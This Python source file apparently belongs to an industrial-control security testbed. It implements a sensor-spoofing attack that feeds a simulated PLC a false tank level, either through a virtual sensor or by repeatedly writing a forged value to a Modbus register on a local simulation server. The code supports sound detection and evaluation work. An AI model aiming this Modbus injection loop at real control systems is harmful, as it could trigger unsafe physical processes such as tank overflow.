"""
Attack Scenario 2: Sensor Spoofing.
Falsifies sensor measurements (e.g., reports low water level 20% when tank is actually at 85%),
misleading the PLC into starting the pump and risking process overflow.
"""

import time
from typing import Optional
from .base import BaseAttack
from twinguard.process.tank import WaterTank
from twinguard.modbus.client import TwinGuardModbusClient
from twinguard.modbus.registers import REG_TANK_LEVEL_SENSOR, RegisterMap


class SensorSpoofingAttack(BaseAttack):
    """
    Overwrites the sensor telemetry with falsified values to decouple
    the reported sensor reading from the true physical process state.
    """

    def __init__(
        self,
        tank: Optional[WaterTank] = None,
        spoofed_level: float = 20.0,
        target_host: str = "127.0.0.1",
        target_port: int = 5020,
        duration_sec: float = 15.0,
    ) -> None:
        super().__init__(
            name="sensor_spoofing",
            description="Falsifies reported tank level to mislead PLC into unsafe filling.",
            target_host=target_host,
            target_port=target_port,
            duration_sec=duration_sec,
        )
        self.tank = tank
        self.spoofed_level = float(spoofed_level)

    def execute(self) -> None:
        end_time = time.time() + self.duration_sec

        # Method A: Direct injection into virtual sensor if tank reference provided
        if self.tank is not None:
            try:
                self.tank.level_sensor.set_spoof(self.spoofed_level)
                while not self._stop_event.is_set() and time.time() < end_time:
                    state = self.tank.get_state()
                    self.events_injected += 1
                    self.metrics["last_spoof"] = {
                        "true_level": state["true_level"],
                        "spoofed_level": self.spoofed_level,
                        "residual": state["residual"],
                        "timestamp": time.time(),
                    }
                    time.sleep(0.2)
            finally:
                self.tank.level_sensor.clear_spoof()
        else:
            # Method B: Modbus Register injection
            client = TwinGuardModbusClient(host=self.target_host, port=self.target_port)
            if not client.connect():
                self.metrics["error"] = "Failed to connect to simulation Modbus server"
                return
            raw_spoof = RegisterMap.to_raw(REG_TANK_LEVEL_SENSOR, self.spoofed_level)
            try:
                while not self._stop_event.is_set() and time.time() < end_time:
                    client.write_register_raw(address=REG_TANK_LEVEL_SENSOR, value=raw_spoof)
                    self.events_injected += 1
                    time.sleep(0.1)
            finally:
                client.close()

        self.metrics["total_spoofs"] = self.events_injected
